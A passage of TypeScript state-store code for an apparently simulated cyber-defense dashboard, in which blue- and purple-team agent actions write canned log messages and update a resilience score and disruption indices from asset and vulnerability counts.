          { id: `msg-blue-${Date.now()}`, timestamp, sender: 'Blue Team Agent', recipient: 'Supervisor Agent', content: `Applied quarantine and compiled Sigma rule for CVE-2024-38193.` },
          ...state.agentMessages
        ]
      };
    });
    get().updateArsCalculation();
  },

  runPurpleTeamAudit: () => {
    set((state) => {
      const timestamp = new Date().toISOString();
      const purpleLogs = [
        `[Purple Team] Incident audit: Red Team compromise vs Blue Team detection.`,
        `[Purple Team] Exploits blocked: 100% | Detection delay: 6.4 seconds.`,
        `[Purple Team] Recalculating National Autonomous Resilience Score (ARS) post-audit.`,
        `[Purple Team] Verification report: Defense capability index elevated to 94%.`
      ];

      return {
        purpleTeamLogs: purpleLogs,
        supervisorLogs: [...state.supervisorLogs, '[Purple Team] Audit complete. Calculated defense gaps resolved. ARS score upgraded.'],
        agentMessages: [
          { id: `msg-purple-${Date.now()}`, timestamp, sender: 'Purple Team Agent', recipient: 'Supervisor Agent', content: `Completed coverage audit. Verified 100% mitigation efficiency.` },
          ...state.agentMessages
        ]
      };
    });
    get().updateArsCalculation();
  },

  updateArsCalculation: () => {
    set((state) => {
      // Calculate ARS factors
      const totalAssets = state.assets.length;
      const compromised = state.assets.filter(a => a.status === 'compromised').length;
      const isolated = state.assets.filter(a => a.status === 'isolated').length;
      const patched = state.vulnerabilities.filter(v => v.status === 'patched').length;

      // ARS Breakdown formula
      const anomaliesFactor = Math.max(0, 30 - compromised * 15);
      const segmentationFactor = Math.min(25, isolated * 12 + 10);
      const patchesFactor = Math.min(25, patched * 8 + 12);
      const backupsFactor = 20; // Verified backups constant

      const newArs = Math.min(100, Math.max(0, anomaliesFactor + segmentationFactor + patchesFactor + backupsFactor));

      // Calculate national disruption values based on compromises
      const powerDisruption = compromised > 0 ? 45 : 5;
      const medicalDisruption = compromised > 0 ? 80 : 35;

      return {
        globalArs: newArs,
        arsBreakdown: {
          anomalies: anomaliesFactor,
          segmentation: segmentationFactor,
          patches: patchesFactor,
          backups: backupsFactor
        },
        nationalDisruptionIndex: {
          power: powerDisruption,
          medical: medicalDisruption,
          transport: 0,
          water: 0
        }
      };
    });
  }
}));

const setNotif = (message: string) => {
  // Dispatched internally via listeners or stores.
  // In our Next.js UI we can bind state alerts to store actions.
};
